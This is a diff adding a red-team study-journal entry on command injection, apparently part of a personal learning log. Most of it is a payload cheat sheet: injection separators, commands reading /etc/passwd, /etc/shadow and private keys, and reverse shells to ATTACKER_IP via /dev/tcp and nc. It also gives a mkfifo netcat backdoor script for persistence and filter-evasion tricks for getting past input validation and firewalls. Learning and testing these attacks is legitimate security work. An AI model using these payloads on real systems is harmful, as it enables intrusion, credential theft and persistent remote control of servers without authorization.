@@ -1086,3 +1086,133 @@ Application-level checks - Overwhelmed with parallel requests
 ◽ Advanced Persistence Techniques
 
 OPERATIONAL NOTES: Race conditions represent sophisticated attacks that target fundamental architectural flaws. Success requires precise timing, understanding of business logic, and the ability to coordinate concurrent attacks effectively. These vulnerabilities often reveal deep-seated issues in application design rather than simple implementation bugs.
+
+# Red Monster Journey 🐲 
+## Command Injection Vulnerability Mastery
+
+### 🎯 MODULE COMPLETION: COMMAND INJECTION
+**Status:** Mastered ✅
+**Red Team Application:** System-Level Compromise & Server Control
+
+### 🔴 COMMAND INJECTION TRADECRAFT DOCUMENTATION
+
+#### 📊 VULNERABILITY OVERVIEW
+Command injection vulnerabilities allow attackers to execute arbitrary operating system commands through vulnerable web applications, providing direct system access with the application's privileges.
+
+#### 🎲 EXPLOITATION TECHNIQUES MASTERED
+
+##### DETECTION METHODS
+```http
+# Verbose Command Injection (Output Visible)
+GET /ping.php?ip=127.0.0.1;whoami
+Response: PING 127.0.0.1...root
+
+# Blind Command Injection (No Direct Output)
+GET /ping.php?ip=127.0.0.1;sleep+5
+Observation: 5-second delay indicates successful injection
+OPERATING SYSTEM SPECIFIC PAYLOADS
+bash
+# Linux/Unix Command Separators
+; whoami                    # Always execute
+| whoami                    # Pipe output
+&& whoami                   # Execute if previous succeeds
+|| whoami                   # Execute if previous fails
+`whoami`                    # Command substitution
+$(whoami)                   # Modern command substitution
+
+# Windows Command Separators
+& whoami                    # Execute both commands
+| whoami                    # Pipe (different behavior)
+&& whoami                   # Execute if previous succeeds  
+|| whoami                   # Execute if previous fails
+ADVANCED EXPLOITATION PAYLOADS
+bash
+# System Enumeration
+; uname -a                  # System information
+; whoami                    # Current user
+; cat /etc/passwd           # User accounts
+; ps aux                    # Running processes
+
+# File System Access
+; find / -name "*.pem" 2>/dev/null    # Find private keys
+; cat /etc/shadow           # Password hashes (requires root)
+
+# Network Reconnaissance
+; ifconfig                  # Network interfaces
+; netstat -tuln             # Open ports
+; arp -a                    # ARP table
+
+# Reverse Shells
+; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
+; nc ATTACKER_IP 443 -e /bin/bash
+🛠️ RED TEAM OPERATIONAL PROCEDURES
+RECONNAISSANCE PHASE
+Parameter analysis in network tools, file processors, and admin interfaces
+
+Identification of system-interacting functionality (ping, traceroute, file conversion)
+
+Testing of all user inputs that might be passed to system commands
+
+EXPLOITATION PHASE
+Initial Foothold
+
+bash
+# Basic command execution verification
+; echo "vulnerable" > /tmp/test.txt
+; ping -c 1 ATTACKER_IP
+System Enumeration
+
+bash
+# Privilege and system information
+; id && uname -a && cat /etc/issue
+; sudo -l 2>/dev/null
+Privilege Escalation
+
+bash
+# SUID binaries and writable directories
+; find / -perm -4000 2>/dev/null
+; find / -writable 2>/dev/null | grep -v proc
+Persistence Establishment
+
+bash
+# Reverse shell and backdoor creation
+; echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 443 >/tmp/f' > /tmp/shell.sh
+; chmod +x /tmp/shell.sh
+FILTER EVASION TECHNIQUES
+bash
+# Space Bypass
+;cat</etc/passwd
+;{cat,/etc/passwd}
+
+# Character Encoding
+; c$a't /etc/passwd
+; whoam$@i
+
+# Case Manipulation
+; WhOaMi
+; $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+📈 RISK ASSESSMENT
+Impact: CRITICAL (Full system compromise)
+
+Detection Difficulty: Low-Medium (Command execution logs)
+
+Exploitation Complexity: Low (Direct system access)
+
+🔧 MITIGATIONS UNDERSTOOD & EVADED
+Input validation and sanitization - Bypassed with encoding
+
+Allowlisting of expected input - Evaded with special characters
+
+Web Application Firewalls - Defeated with obfuscation techniques
+
+Least privilege principle - Overcome through privilege escalation
+
+🚀 PROGRESSION IN RED TEAM SKILL MATRIX
+✅ Network Security
+✅ Web Application Security
+✅ Client-Side Attacks
+✅ Business Logic Attacks
+✅ System-Level Compromise ← COMMAND INJECTION ADDED
+◽ Final Module: Web Application Scanning
+
+OPERATIONAL NOTES: Command injection represents one of the most severe web vulnerabilities, providing direct system access. Success requires understanding of operating system commands, filter evasion techniques, and post-exploitation methodologies for maintaining access and pivoting through networks.
